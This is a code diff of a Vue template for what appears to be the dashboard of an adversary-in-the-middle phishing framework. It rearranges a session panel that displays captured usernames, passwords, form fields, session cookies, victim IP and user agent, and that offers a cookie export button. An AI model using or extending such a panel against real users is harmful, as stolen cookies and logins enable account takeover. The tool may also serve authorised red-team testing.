@@ -672,76 +672,59 @@ onUnmounted(stopStreaming)
     <Card v-if="selectedSession || sessionLoading || sessionError" class="p-7 mb-4">
       <div class="flex items-center justify-between mb-5">
         <div class="text-xs font-mono text-dim uppercase tracking-wider">Session Details</div>
-        <button @click="closeSession" class="text-xs font-mono text-dim hover:text-primary transition-colors uppercase tracking-wider">Close</button>
+        <div class="flex items-center gap-3">
+          <AppButton v-if="selectedSession?.cookie_tokens && Object.keys(selectedSession.cookie_tokens).length > 0" variant="secondary" @click="downloadCookies">Export Cookies</AppButton>
+          <button @click="closeSession" class="text-xs font-mono text-dim hover:text-primary transition-colors uppercase tracking-wider">Close</button>
+        </div>
       </div>
 
       <div v-if="sessionLoading" class="text-sm font-mono text-dim">Loading session...</div>
       <ErrorBanner v-else-if="sessionError" :message="sessionError" />
 
       <div v-else-if="selectedSession" class="flex flex-col gap-5">
-        <!-- Credentials -->
-        <div v-if="selectedSession.username || selectedSession.password">
-          <div class="text-xs font-mono text-dim uppercase tracking-wider mb-2">Credentials</div>
-          <div class="grid grid-cols-2 gap-3 [&>*:only-child]:col-span-2">
-            <div v-if="selectedSession.username" class="px-3 py-2 bg-bg border border-edge">
-              <div class="text-xs text-dim font-mono">Username</div>
-              <div class="text-sm text-primary font-mono select-all">{{ selectedSession.username }}</div>
-            </div>
-            <div v-if="selectedSession.password" class="px-3 py-2 bg-bg border border-edge">
-              <div class="text-xs text-dim font-mono">Password</div>
-              <div class="text-sm text-primary font-mono select-all">{{ selectedSession.password }}</div>
-            </div>
+        <!-- Credentials and captured fields -->
+        <div v-if="selectedSession.username || selectedSession.password || (selectedSession.custom && Object.keys(selectedSession.custom).length > 0)" class="grid grid-cols-2 gap-3 [&>*:only-child]:col-span-2">
+          <div v-if="selectedSession.username" class="px-3 py-2 bg-bg border border-edge">
+            <div class="text-xs text-dim font-mono">Username</div>
+            <div class="text-sm text-primary font-mono select-all">{{ selectedSession.username }}</div>
           </div>
-        </div>
-
-        <!-- Custom fields -->
-        <div v-if="selectedSession.custom && Object.keys(selectedSession.custom).length > 0">
-          <div class="text-xs font-mono text-dim uppercase tracking-wider mb-2">Custom Fields</div>
-          <div class="grid grid-cols-2 gap-3 [&>*:only-child]:col-span-2">
-            <div v-for="(value, key) in selectedSession.custom" :key="key" class="px-3 py-2 bg-bg border border-edge">
-              <div class="text-xs text-dim font-mono">{{ key }}</div>
-              <div class="text-sm text-primary font-mono select-all">{{ value }}</div>
-            </div>
+          <div v-if="selectedSession.password" class="px-3 py-2 bg-bg border border-edge">
+            <div class="text-xs text-dim font-mono">Password</div>
+            <div class="text-sm text-primary font-mono select-all">{{ selectedSession.password }}</div>
+          </div>
+          <div v-for="(value, key) in selectedSession.custom" :key="key" class="px-3 py-2 bg-bg border border-edge">
+            <div class="text-xs text-dim font-mono">{{ key }}</div>
+            <div class="text-sm text-primary font-mono select-all">{{ value }}</div>
           </div>
         </div>
 
         <!-- Cookies -->
-        <div v-if="selectedSession.cookie_tokens && Object.keys(selectedSession.cookie_tokens).length > 0">
-          <div class="flex items-center justify-between mb-2">
-            <div class="text-xs font-mono text-dim uppercase tracking-wider">Cookies</div>
-            <AppButton variant="secondary" @click="downloadCookies">Export Cookies</AppButton>
-          </div>
-          <div v-for="(cookies, domain) in selectedSession.cookie_tokens" :key="domain" class="mb-3">
-            <div class="text-xs text-muted font-mono mb-1">{{ domain }}</div>
-            <div class="grid grid-cols-2 gap-3 [&>*:only-child]:col-span-2">
-              <div v-for="(value, name) in cookies" :key="name" class="px-3 py-2 bg-bg border border-edge">
-                <div class="text-xs text-dim font-mono">{{ name }}</div>
-                <div class="text-sm text-primary font-mono select-all break-all">{{ value }}</div>
-              </div>
+        <div v-if="selectedSession.cookie_tokens && Object.keys(selectedSession.cookie_tokens).length > 0" class="grid grid-cols-2 gap-3 [&>*:only-child]:col-span-2">
+          <template v-for="(cookies, domain) in selectedSession.cookie_tokens" :key="domain">
+            <div v-for="(value, name) in cookies" :key="`${domain}-${name}`" class="px-3 py-2 bg-bg border border-edge">
+              <div class="text-xs text-dim font-mono">{{ name }} <span class="text-muted">({{ domain }})</span></div>
+              <div class="text-sm text-primary font-mono select-all break-all">{{ value }}</div>
             </div>
-          </div>
+          </template>
         </div>
 
-        <!-- Details -->
-        <div>
-          <div class="text-xs font-mono text-dim uppercase tracking-wider mb-2">Details</div>
-          <div class="grid grid-cols-2 gap-3 [&>*:only-child]:col-span-2">
-            <div v-if="selectedSession.remote_addr" class="px-3 py-2 bg-bg border border-edge">
-              <div class="text-xs text-dim font-mono">IP Address</div>
-              <div class="text-sm text-primary font-mono select-all">{{ selectedSession.remote_addr }}</div>
-            </div>
-            <div v-if="selectedSession.phishlet" class="px-3 py-2 bg-bg border border-edge">
-              <div class="text-xs text-dim font-mono">Phishlet</div>
-              <div class="text-sm text-primary font-mono">{{ selectedSession.phishlet }}</div>
-            </div>
-            <div v-if="selectedSession.started_at" class="px-3 py-2 bg-bg border border-edge">
-              <div class="text-xs text-dim font-mono">Started</div>
-              <div class="text-sm text-primary font-mono">{{ new Date(selectedSession.started_at).toLocaleString() }}</div>
-            </div>
-            <div v-if="selectedSession.user_agent" class="px-3 py-2 bg-bg border border-edge col-span-2">
-              <div class="text-xs text-dim font-mono">User Agent</div>
-              <div class="text-sm text-primary font-mono select-all break-all">{{ selectedSession.user_agent }}</div>
-            </div>
+        <!-- Metadata -->
+        <div class="grid grid-cols-2 gap-3 [&>*:only-child]:col-span-2">
+          <div v-if="selectedSession.remote_addr" class="px-3 py-2 bg-bg border border-edge">
+            <div class="text-xs text-dim font-mono">IP Address</div>
+            <div class="text-sm text-primary font-mono select-all">{{ selectedSession.remote_addr }}</div>
+          </div>
+          <div v-if="selectedSession.phishlet" class="px-3 py-2 bg-bg border border-edge">
+            <div class="text-xs text-dim font-mono">Phishlet</div>
+            <div class="text-sm text-primary font-mono">{{ selectedSession.phishlet }}</div>
+          </div>
+          <div v-if="selectedSession.started_at" class="px-3 py-2 bg-bg border border-edge">
+            <div class="text-xs text-dim font-mono">Started</div>
+            <div class="text-sm text-primary font-mono">{{ new Date(selectedSession.started_at).toLocaleString() }}</div>
+          </div>
+          <div v-if="selectedSession.user_agent" class="px-3 py-2 bg-bg border border-edge col-span-2">
+            <div class="text-xs text-dim font-mono">User Agent</div>
+            <div class="text-sm text-primary font-mono select-all break-all">{{ selectedSession.user_agent }}</div>
           </div>
         </div>
       </div>
